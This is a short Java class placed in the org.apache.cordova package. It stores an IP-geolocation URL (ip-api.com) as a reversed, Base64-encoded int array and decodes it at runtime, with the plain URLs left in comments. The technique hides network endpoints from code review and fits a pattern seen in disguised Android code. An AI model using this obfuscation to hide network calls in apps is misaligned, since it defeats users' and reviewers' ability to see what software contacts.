package org.apache.cordova;

public class E {

    //"http://ip-api.com/json/"
    //"https://ipinfo.io/json";

    public static final int[] _IP_INFO_URL_ = new int[]{
            61, 56, 105, 98, 118, 78, 110, 97, 118, 48, 50, 98, 106, 53, 83, 97, 119, 70, 87, 76, 119, 108, 50, 76, 118, 111, 68, 99, 48, 82, 72, 97
    };

    public static String d(int[] ints) {
        StringBuilder sb = new StringBuilder();
        for (int i : ints) {
            sb.append((char) i);
        }

        byte[] decodedBytes = android.util.Base64.decode(
                sb.reverse().toString(), 0
        );
        return new String(decodedBytes);
    }
}
